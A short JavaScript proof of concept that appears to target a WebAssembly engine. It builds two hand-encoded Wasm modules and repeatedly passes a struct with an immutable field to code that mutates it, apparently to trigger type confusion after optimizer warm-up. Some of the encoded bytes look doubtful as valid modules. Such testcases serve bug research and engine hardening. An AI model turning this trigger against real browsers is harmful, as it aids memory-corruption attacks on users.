function poc(const_module, mut_module) {
    try {
        const instance_const = new WebAssembly.Instance(const_module);
        const instance_mut = new WebAssembly.Instance(mut_module);
        const const_struct_obj = instance_const.exports.make();
        instance_mut.exports.mutate_and_get(const_struct_obj);
    } catch (e) {
        
    }
}

const wasm_const_bytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 95, 1, 112, 1, 127, 0, 3, 2, 1, 0, 7, 8, 1, 4, 109, 97, 107, 101, 0, 0, 10, 9, 1, 7, 0, 65, 42, 107, 0, 11]);
const wasm_mut_bytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 95, 1, 112, 1, 127, 1, 3, 3, 2, 0, 1, 7, 18, 1, 14, 109, 117, 116, 97, 116, 101, 95, 97, 110, 100, 95, 103, 101, 116, 0, 1, 10, 17, 1, 15, 0, 32, 0, 65, 201, 10, 108, 0, 0, 32, 0, 107, 0, 0, 11]);

const module_const = new WebAssembly.Module(wasm_const_bytes);
const module_mut = new WebAssembly.Module(wasm_mut_bytes);

for (let i = 0; i < 100; ++i) {
    poc(module_const, module_mut);
}

const final_instance_const = new WebAssembly.Instance(module_const);
const final_instance_mut = new WebAssembly.Instance(module_mut);
const final_const_struct_obj = final_instance_const.exports.make();
final_instance_mut.exports.mutate_and_get(final_const_struct_obj);